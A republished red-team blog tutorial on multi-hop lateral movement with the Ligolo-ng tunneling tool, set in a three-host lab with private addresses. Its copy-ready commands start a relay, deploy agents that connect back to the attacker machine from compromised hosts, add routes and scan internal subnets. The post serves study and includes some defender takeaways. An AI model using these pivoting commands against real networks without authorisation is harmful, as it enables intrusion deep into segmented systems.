---
layout: post
title: "Lateral Movement: Multi-Hop Pivoting with Ligolo-ng"
date: 2025-07-01
categories: red-team
tags: pivoting, lateral-movement, ligolo-ng, tunneling, red-team, networking
image: /img/ligolo-thumb.svg
---

<style>
  .credit-banner {
    background: #0a1a0a;
    border: 1px solid #00ff4133;
    border-left: 4px solid #00ff41;
    border-radius: 0 6px 6px 0;
    padding: 0.8rem 1.2rem;
    margin-bottom: 2rem;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    color: #4a7a4a;
    display: flex;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
  }
  .credit-banner a { color: #00ff41; text-decoration: none; font-weight: 700; }
  .credit-banner a:hover { text-decoration: underline; }
  .credit-banner .icon { font-size: 1rem; }

  .post-intro {
    background: #050f05;
    border: 1px solid #00ff4122;
    border-radius: 6px;
    padding: 1.2rem 1.4rem;
    margin-bottom: 2rem;
    font-size: 13px;
    color: #c9d1d9;
    line-height: 1.8;
  }

  .section-hdr {
    font-family: 'Courier New', monospace;
    font-size: 11px;
    color: #00ff41;
    letter-spacing: 3px;
    text-transform: uppercase;
    margin: 2rem 0 1rem;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .section-hdr::before { content: "//"; color: #00ff4155; }
  .section-hdr::after { content: ""; flex: 1; height: 1px; background: #00ff4122; }

  .net-diagram {
    background: #050f05;
    border: 1px solid #00ff4133;
    border-radius: 8px;
    padding: 1.5rem;
    margin: 1.5rem 0;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    overflow-x: auto;
  }
  .net-diagram .net-title {
    font-size: 10px;
    color: #4a7a4a;
    letter-spacing: 2px;
    text-transform: uppercase;
    margin-bottom: 1.2rem;
  }
  .net-diagram .net-title::before { content: "// "; color: #00ff4155; }

  .net-node {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin-bottom: 10px;
  }
  .net-node-icon {
    width: 36px;
    height: 36px;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.1rem;
    flex-shrink: 0;
  }
  .node-attacker { background: #1a0707; border: 1px solid #ff004033; }
  .node-pivot    { background: #0a1a0a; border: 1px solid #ffb30033; }
  .node-target   { background: #071a11; border: 1px solid #00ff4133; }

  .net-node-info { flex: 1; }
  .net-node-name { font-weight: 700; font-size: 13px; color: #c9d1d9; }
  .net-node-ip   { font-size: 11px; color: #00ff41; margin-top: 2px; line-height: 1.8; }

  .net-arrow {
    text-align: center;
    color: #00ff4166;
    font-size: 11px;
    letter-spacing: 2px;
    margin: 4px 0 4px 24px;
    font-family: 'Courier New', monospace;
  }

  .phase-block {
    background: #050f05;
    border: 1px solid #00ff4122;
    border-radius: 6px;
    margin-bottom: 1.5rem;
    overflow: hidden;
  }
  .phase-hdr {
    background: #0a1a0a;
    border-bottom: 1px solid #00ff4122;
    padding: 10px 14px;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .phase-num {
    background: #00ff41;
    color: #000;
    font-family: 'Courier New', monospace;
    font-weight: 700;
    font-size: 11px;
    padding: 2px 8px;
    border-radius: 3px;
    letter-spacing: 1px;
  }
  .phase-title { font-family: 'Courier New', monospace; font-size: 14px; font-weight: 700; color: #c9d1d9; }
  .phase-sub   { font-family: 'Courier New', monospace; font-size: 11px; color: #4a7a4a; margin-left: auto; }
  .phase-body  { padding: 1.2rem 1.4rem; font-size: 13px; color: #c9d1d9; line-height: 1.8; }

  .cmd-block {
    background: #0a1a0a;
    border: 1px solid #00ff4133;
    border-radius: 6px;
    margin: 0.8rem 0;
    overflow: hidden;
  }
  .cmd-label {
    background: #050f05;
    border-bottom: 1px solid #00ff4111;
    padding: 4px 12px;
    font-size: 10px;
    color: #4a7a4a;
    letter-spacing: 2px;
    text-transform: uppercase;
    display: flex;
    align-items: center;
    justify-content: space-between;
    font-family: 'Courier New', monospace;
  }
  .cmd-label span { color: #ff6060; }
  .cmd-label span.attacker { color: #00ff41; }
  .cmd-label span.victim   { color: #ffb300; }
  .cmd-text {
    padding: 0.7rem 1rem;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    color: #00ff41;
    font-weight: 700;
    white-space: pre-wrap;
    word-break: break-all;
    position: relative;
    cursor: pointer;
  }
  .cmd-text:hover { background: #0f240f; }
  .cmd-copy {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: transparent;
    border: 1px solid #00ff4133;
    color: #4a7a4a;
    font-size: 9px;
    padding: 2px 8px;
    border-radius: 2px;
    cursor: pointer;
    font-family: 'Courier New', monospace;
    transition: all 0.15s;
  }
  .cmd-copy:hover { border-color: #00ff41; color: #00ff41; }
  .cmd-copy.ok { color: #00ff41; background: #071a11; }

  .note-box {
    background: #0a1400;
    border: 1px solid #ffb30033;
    border-left: 3px solid #ffb300;
    border-radius: 0 6px 6px 0;
    padding: 0.8rem 1rem;
    margin: 0.8rem 0;
    font-size: 12px;
    color: #aaa;
    font-family: 'Courier New', monospace;
  }
  .note-box strong { color: #ffb300; }

  .info-box {
    background: #071a11;
    border: 1px solid #00ff4133;
    border-left: 3px solid #00ff41;
    border-radius: 0 6px 6px 0;
    padding: 0.8rem 1rem;
    margin: 0.8rem 0;
    font-size: 12px;
    color: #aaa;
    font-family: 'Courier New', monospace;
  }
  .info-box strong { color: #00ff41; }

  .conclusion {
    background: #050f05;
    border: 1px solid #00ff4133;
    border-radius: 6px;
    padding: 1.2rem 1.4rem;
    margin-top: 2rem;
    font-size: 13px;
    color: #c9d1d9;
    line-height: 1.8;
  }
  .conclusion h3 { color: #00ff41; font-family: 'Courier New', monospace; font-size: 14px; margin-bottom: 0.8rem; }

  .ref-box {
    background: #0a1a0a;
    border: 1px solid #00ff4122;
    border-radius: 6px;
    padding: 1rem 1.4rem;
    margin-top: 1.5rem;
    font-size: 12px;
    font-family: 'Courier New', monospace;
  }
  .ref-box h4 { color: #00ff41; margin-bottom: 0.6rem; letter-spacing: 2px; text-transform: uppercase; font-size: 11px; }
  .ref-box a { color: #00ff41; text-decoration: none; }
  .ref-box a:hover { text-decoration: underline; }
  .ref-box li { color: #4a7a4a; margin-bottom: 4px; line-height: 1.8; }
</style>

<!-- CREDIT BANNER -->
<div class="credit-banner">
  <span class="icon">📖</span>
  <span>Original article by <strong>CyberWarfare Live (CWL)</strong> —</span>
  <a href="https://cyberwarfare.live/lateral-movement-a-guide-to-multi-hop-pivoting-with-ligolo-ng/" target="_blank">
    Lateral Movement: A Guide to Multi-Hop Pivoting with Ligolo-ng ↗
  </a>
  <span style="color:#2a2f42;">|</span>
  <span>Republished for personal study reference</span>
</div>

<!-- INTRO -->
<div class="post-intro">
Modern networks are no longer flat or openly exposed. Sensitive systems are hidden deep behind layers of segmentation, making direct access nearly impossible. That's where <strong style="color:#00ff41">pivoting</strong> comes in — a technique attackers use to move laterally through networks after an initial compromise.<br><br>
This guide walks through a multi-hop pivoting scenario using <strong style="color:#00ff41">Ligolo-ng</strong>, a powerful tunneling tool that makes lateral movement seamless. Step by step, we demonstrate how an attacker can traverse segmented networks from the first compromised host all the way to a high-value internal target.
</div>

<div class="section-hdr">What is Pivoting?</div>

**Pivoting** is a post-exploitation technique used to **route traffic through a compromised system** to reach other systems within the same network that are not directly accessible from the attacker's original position. It allows the attacker to **move laterally** across network segments by using the compromised host as a **bridge or proxy**.

<div class="section-hdr">Scenario Overview</div>

The objective is to establish access to a high-value target machine **M3** from the **attacker machine**, by pivoting through two intermediary dual-homed systems — **M1** and **M2**.

**Core Tooling:**
- **Ligolo-ng** — multiplexed TCP tunnels over a single connection
- **Nmap / Ping** — for validating connectivity

<!-- NETWORK DIAGRAM -->
<div class="net-diagram">
  <div class="net-title">Network Architecture</div>

  <div class="net-node">
    <div class="net-node-icon node-attacker">💻</div>
    <div class="net-node-info">
      <div class="net-node-name">Attacker Machine (Kali Linux)</div>
      <div class="net-node-ip">192.168.8.2</div>
    </div>
  </div>
  <div class="net-arrow">│ reachable ↓</div>

  <div class="net-node">
    <div class="net-node-icon node-pivot">🖥️</div>
    <div class="net-node-info">
      <div class="net-node-name">M1 — First Pivot Host</div>
      <div class="net-node-ip">eth0: 192.168.8.10 (reachable from attacker)<br>eth1: 192.168.80.10 (internal link to M2)</div>
    </div>
  </div>
  <div class="net-arrow">│ tunnel ↓</div>

  <div class="net-node">
    <div class="net-node-icon node-pivot">🖥️</div>
    <div class="net-node-info">
      <div class="net-node-name">M2 — Second Pivot Host</div>
      <div class="net-node-ip">eth0: 192.168.80.15 (reachable from M1)<br>eth1: 172.16.25.2 (internal link to M3)</div>
    </div>
  </div>
  <div class="net-arrow">│ tunnel ↓</div>

  <div class="net-node">
    <div class="net-node-icon node-target">🎯</div>
    <div class="net-node-info">
      <div class="net-node-name">M3 — Final Target Server</div>
      <div class="net-node-ip">172.16.25.100</div>
    </div>
  </div>
</div>

<div class="section-hdr">Execution Walkthrough</div>

<!-- PHASE 1 -->
<div class="phase-block">
  <div class="phase-hdr">
    <span class="phase-num">PHASE 1</span>
    <span class="phase-title">Initial Setup — The Attacker's Relay</span>
    <span class="phase-sub">Attacker Machine</span>
  </div>
  <div class="phase-body">

Configure the Ligolo-ng <strong>proxy (relay)</strong> on the attacker machine. The relay acts as the central server, listening for incoming connections from agent binaries deployed on compromised hosts.

<div class="info-box"><strong>Install Ligolo-ng:</strong> Download both the <code>proxy</code> and <code>agent</code> binaries from the official GitHub releases page: <a href="https://github.com/nicocha30/ligolo-ng/releases" target="_blank" style="color:#00ff41">github.com/nicocha30/ligolo-ng/releases</a></div>

First, verify your attacker machine IP address:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Verify IP address</div>
  <div class="cmd-text">ip a<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

Once confirmed, start the relay server with a self-signed certificate:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Start Ligolo-ng proxy relay</div>
  <div class="cmd-text">./proxy -selfcert -laddr 0.0.0.0:443<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

The proxy will now listen on port 443 for incoming agent connections.

  </div>
</div>

<!-- PHASE 2 -->
<div class="phase-block">
  <div class="phase-hdr">
    <span class="phase-num">PHASE 2</span>
    <span class="phase-title">First Pivot — Attacker → M1</span>
    <span class="phase-sub">Attacker → M1</span>
  </div>
  <div class="phase-body">

Assuming initial access to M1 has already been achieved, deploy and execute the Ligolo-ng agent on the victim machine.

<div class="cmd-block">
  <div class="cmd-label"><span class="victim">[M1 VICTIM]</span> Connect agent to attacker relay</div>
  <div class="cmd-text">./agent -connect 192.168.8.2:443 -ignore-cert<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

<div class="note-box"><strong>Note:</strong> <code>-ignore-cert</code> skips TLS certificate validation since we used a self-signed cert on the proxy.</div>

Once the agent connects, the attacker will see it appear in the Ligolo-ng console. Start the session:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Start tunnel session in Ligolo-ng console</div>
  <div class="cmd-text">session
start</div>
</div>

Check the victim's network interfaces to discover additional subnets:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER — Ligolo-ng console]</span> List victim interfaces</div>
  <div class="cmd-text">ifconfig<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

You will see M1 has an additional interface on **192.168.80.0/24**. Add a route on the attacker machine to reach this subnet through the tunnel:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Add route to M1's internal subnet</div>
  <div class="cmd-text">sudo ip route add 192.168.80.0/24 dev ligolo<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

Validate connectivity to the new subnet:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Scan the newly reachable subnet</div>
  <div class="cmd-text">nmap -v -n 192.168.80.0/24 -T4 --unprivileged<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

You should now see live hosts on the **192.168.80.0/24** network — including M2 at **192.168.80.15**.

  </div>
</div>

<!-- PHASE 3 -->
<div class="phase-block">
  <div class="phase-hdr">
    <span class="phase-num">PHASE 3</span>
    <span class="phase-title">Second Pivot — M1 → M2</span>
    <span class="phase-sub">M1 → M2</span>
  </div>
  <div class="phase-body">

With the first tunnel active and M2 reachable, deploy the Ligolo-ng agent on M2. After gaining access to M2, run the agent:

<div class="cmd-block">
  <div class="cmd-label"><span class="victim">[M2 VICTIM]</span> Connect M2 agent to attacker relay</div>
  <div class="cmd-text">./agent -connect 192.168.8.2:443 -ignore-cert<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

The attacker will now see a second agent appear in the Ligolo-ng console. Select the M2 session. Check M2's interfaces to find the next internal subnet:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER — Ligolo-ng console — M2 session]</span></div>
  <div class="cmd-text">session
ifconfig</div>
</div>

M2 reveals another interface on **172.16.25.0/24**. Add a route to reach this subnet:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Add route to M2's internal subnet</div>
  <div class="cmd-text">sudo ip route add 172.16.25.0/24 dev ligolo<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

Scan the new subnet to confirm M3 is reachable:

<div class="cmd-block">
  <div class="cmd-label"><span class="attacker">[ATTACKER]</span> Scan M3's subnet</div>
  <div class="cmd-text">nmap -v -n 172.16.25.0/24 -T4 --unprivileged<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

  </div>
</div>

<!-- PHASE 4 -->
<div class="phase-block">
  <div class="phase-hdr">
    <span class="phase-num">PHASE 4</span>
    <span class="phase-title">Final Hop — M2 → M3</span>
    <span class="phase-sub">M2 → M3 (Target)</span>
  </div>
  <div class="phase-body">

Deploy the Ligolo-ng agent on M3 using the pivoted access through M2:

<div class="cmd-block">
  <div class="cmd-label"><span class="victim">[M3 VICTIM]</span> Connect M3 agent to attacker relay</div>
  <div class="cmd-text">./agent -connect 192.168.8.2:443 -ignore-cert<button class="cmd-copy" onclick="cpCmd(this)">copy</button></div>
</div>

Once M3's agent connects back to the relay, select its session in the Ligolo-ng console and start the tunnel. The attacker now has **direct tunneled access to M3 at 172.16.25.100** — the final high-value target.

<div class="info-box"><strong>Success:</strong> Three network segments traversed. The attacker machine now has full tunneled access to M3 without ever being directly routable to it.</div>

  </div>
</div>

<!-- COMMAND SUMMARY -->
<div class="section-hdr">Full Command Summary</div>

| Step | Where | Command |
|------|--------|---------|
| 1 | Attacker | `./proxy -selfcert -laddr 0.0.0.0:443` |
| 2 | M1 | `./agent -connect 192.168.8.2:443 -ignore-cert` |
| 3 | Attacker | `session` → `start` |
| 4 | Attacker | `sudo ip route add 192.168.80.0/24 dev ligolo` |
| 5 | Attacker | `nmap -v -n 192.168.80.0/24 -T4 --unprivileged` |
| 6 | M2 | `./agent -connect 192.168.8.2:443 -ignore-cert` |
| 7 | Attacker | `sudo ip route add 172.16.25.0/24 dev ligolo` |
| 8 | Attacker | `nmap -v -n 172.16.25.0/24 -T4 --unprivileged` |
| 9 | M3 | `./agent -connect 192.168.8.2:443 -ignore-cert` |

<!-- CONCLUSION -->
<div class="conclusion">
  <h3>// Conclusion</h3>
  This guide demonstrated how <strong>Ligolo-ng</strong> can be used to effortlessly pivot across multiple layers of a segmented network. The use of multi-hop tunneling highlights the importance of proper <strong>network segmentation</strong>, <strong>egress filtering</strong>, and <strong>internal visibility</strong> for defenders.<br><br>
  Whether you're on the offensive or defensive side, understanding lateral movement and pivoting techniques is crucial for maintaining strong network security posture.
  <br><br>
  <strong style="color:#00ff41">Key takeaways:</strong>
  <ul style="margin-top:0.5rem;color:#aaa;font-size:13px;line-height:2;">
    <li>Ligolo-ng uses a single outbound connection — difficult to detect compared to traditional proxychains</li>
    <li>Each pivot host needs an agent binary — consider how you'll transfer it</li>
    <li>Defenders should monitor for unusual outbound connections on port 443 to unknown IPs</li>
    <li>Network segmentation alone is not enough — internal traffic monitoring is essential</li>
  </ul>
</div>

<!-- REFERENCES -->
<div class="ref-box">
  <h4>// References &amp; Credits</h4>
  <ul style="list-style:none;padding:0;margin:0;">
    <li>📖 Original article: <a href="https://cyberwarfare.live/lateral-movement-a-guide-to-multi-hop-pivoting-with-ligolo-ng/" target="_blank">CyberWarfare Live — Lateral Movement: A Guide to Multi-Hop Pivoting with Ligolo-ng</a></li>
    <li>🔧 Ligolo-ng GitHub: <a href="https://github.com/nicocha30/ligolo-ng" target="_blank">github.com/nicocha30/ligolo-ng</a></li>
    <li>🔧 Ligolo-ng Releases: <a href="https://github.com/nicocha30/ligolo-ng/releases" target="_blank">github.com/nicocha30/ligolo-ng/releases</a></li>
    <li>🎓 CyberWarfare Live: <a href="https://cyberwarfare.live" target="_blank">cyberwarfare.live</a> — Advanced Cyber Attack &amp; Detection Learning Platform</li>
  </ul>
</div>

<script>
function cpCmd(btn) {
  var txt = btn.parentElement.childNodes[0].textContent.trim();
  navigator.clipboard.writeText(txt).then(function() {
    btn.textContent = 'done!'; btn.classList.add('ok');
    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('ok'); }, 1500);
  });
}
</script>

---

*Tags: pivoting · lateral-movement · ligolo-ng · red-team · tunneling · network-segmentation*
